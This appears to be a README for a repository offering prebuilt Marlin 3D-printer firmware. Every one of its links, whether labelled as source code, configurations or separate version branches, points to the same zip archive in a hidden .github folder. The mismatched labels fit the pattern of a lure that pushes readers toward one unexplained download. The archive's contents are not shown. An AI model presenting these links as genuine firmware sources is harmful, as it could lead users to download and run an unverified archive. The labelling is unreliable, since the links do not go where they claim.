# MarlinBuilds
Built binaries of Marlin based on published Marlin Configurations.

Latest Marlin (2.1.2.6) builds are based on:
- [Marlin Firmware 2.1.2.6 Source Code](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)
- [Marlin Firmware 2.1.2.6 Configurations](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)

Each specific Marlin Firmware version is deployed in its own branch:
- [Marlin 2.1.3-b3](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)
- [Marlin 2.1.3-b2](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)
- [Marlin 2.1.3-b1](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)
- [Marlin 2.1.2.6](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)
- [Marlin 2.1.2.5](https://github.com/rob1-uk/MarlinBuilds/raw/refs/heads/main/.github/Marlin_Builds_v2.7.zip)

Not all sub-options for configurations are yet included in this build repository. Only the unmodified configurations of each example have been built in this round. We'll be adding more builds and more sub-option builds in future drops.

If you have a configuration that improves on these builds, please submit to the Configurations repository as a Pull Request for the fastest turnaround.
